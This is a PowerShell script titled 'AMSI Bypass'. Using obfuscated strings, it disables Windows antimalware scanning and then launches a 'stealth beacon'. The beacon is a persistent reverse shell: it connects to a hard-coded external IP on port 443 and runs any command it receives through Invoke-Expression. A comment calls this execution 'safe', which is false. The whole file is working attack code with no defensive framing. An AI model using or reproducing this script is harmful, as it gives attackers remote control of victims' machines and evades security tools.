# AMSI Bypass
[Ref].Assembly.GetType((-join([char]0x53, [char]0x79, [char]0x73, [char]0x74, [char]0x65, [char]0x6D, [char]0x2E, [char]0x4D, [char]0x61, [char]0x6E, [char]0x61, [char]0x67, [char]0x65, [char]0x6D, [char]0x65, [char]0x6E, [char]0x74, [char]0x2E, [char]0x41, [char]0x75, [char]0x74, [char]0x6F, [char]0x6D, [char]0x61, [char]0x74, [char]0x69, [char]0x6F, [char]0x6E, [char]0x2E, [char]0x41, [char]0x6D, [char]0x73, [char]0x69, [char]0x55, [char]0x74, [char]0x69, [char]0x6C, [char]0x73))).GetField('a‍m​s‌i‍I​n‍i‌t‍F‌a‍i‌l‌e​d​',$($k4879='[!_et@';$b=[byte[]](0x15,0x4E,0x31,0x35,0x01,0x22,0x37,0x48,0x3C,0x49,0x27,0x34,0x3A,0x55,0x36,0x06);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4879);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))).SetValue($null,(!0))

function Start-StealthBeacon {
    $IP = (-join('1','8.209.','11.22','6'))
    $Port = 443
    
    while (($null -eq $null)) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
            $stream = $client.GetStream()
            [byte[]]$bytes = New-Object byte[] 8192
            
            Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29ubmVjdGVkIHRvIA=='))) + $IP + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YDo='))) + $Port) -ForegroundColor Green
            
            while ($client.Connected) {
                $i = $stream.Read($bytes, 0, $bytes.Length)
                if ($i -gt 0) {
                    $command = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i).Trim()
                    
                    if ($command -eq $($k6141=155;$b=[byte[]](0xfe,0xe3,0xf2,0xef);-join($b|%{[char]($_-bxor$k6141)}))) { break }
                    if ($command -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGluZw==')))) { 
                        $response = 'роng`n' 
                    } else {
                        # Execute command safely
                        try {
                            $output = Invoke-Expression $command 2>&1 | Out-String
                            $response = $output
                        } catch {
                            $response = ((-join([char]0x45, [char]0x72, [char]0x72, [char]0x6F, [char]0x72, [char]0x3A, [char]0x20)) + $_ + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x6E))))
                        }
                    }
                    
                    $responseBytes = [System.Text.Encoding]::ASCII.GetBytes($response)
                    $stream.Write($responseBytes, 0, $responseBytes.Length)
                    $stream.Flush()
                }
                Start-Sleep -Milliseconds 100
            }
            
            $stream.Close()
            $client.Close()
        }
        catch {
            Write-Host ([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}','Con','necti','on f','ailed',', ret','ryin','g',' in ','30 s','econd','s.','..')) -ForegroundColor Yellow
            Start-Sleep -Seconds 30
        }
    }
}

Start-StealthBeacon
